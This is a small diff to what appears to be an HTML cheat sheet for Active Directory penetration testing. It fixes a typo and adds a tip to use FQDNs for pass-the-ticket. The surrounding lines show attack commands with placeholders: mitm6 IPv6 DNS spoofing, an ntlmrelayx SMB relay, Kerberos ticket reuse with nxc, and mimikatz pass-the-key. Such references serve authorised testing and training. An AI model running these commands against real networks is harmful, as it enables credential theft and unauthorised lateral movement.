@@ -205,7 +205,7 @@ ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span
 <p>Start <code>mitm6</code> to respond with spoofed IPv6 DNS responses:</p>
 <div class="highlight"><pre><span></span><code>mitm6<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;
 </code></pre></div>
-<p>Then relay captured hashes with <code>ntlmrelayx.py</code> (should wait till some DNS events happen):</p>
+<p>Then relay captured hashes with <code>ntlmrelayx.py</code> (should wait 'till some DNS events happen):</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Perform a SMB relay attack</span>
 ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-t<span class="w"> </span>smb://&lt;target&gt;<span class="w"> </span>-smb2support<span class="w"> </span>
 
@@ -1157,6 +1157,7 @@ sekurlsa::pth<span class="w"> </span>/user:&lt;user&gt;<span class="w"> </span>/
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;ccache<span class="w"> </span>ticket<span class="w"> </span>path&gt;
 nxc<span class="w"> </span>&lt;netexex<span class="w"> </span>module&gt;<span class="w"> </span>&lt;target&gt;<span class="w"> </span>--use-kcache<span class="w"> </span><span class="o">[</span>others<span class="w"> </span>module<span class="w"> </span>options...<span class="o">]</span>
 </code></pre></div>
+<p><strong>Note</strong>: <strong>when using pass-the-ticket, always use FQDN for targets!!!</strong></p>
 <p>Perform a <strong>pass-the-key</strong> attack with <code>mimikatz</code>:</p>
 <div class="highlight"><pre><span></span><code>sekurlsa::pth<span class="w"> </span>/user:&lt;user&gt;<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/&lt;key-algorithm&gt;:&lt;key&gt;<span class="w"> </span>/run:<span class="s2">"&lt;command&gt;"</span>
 </code></pre></div>
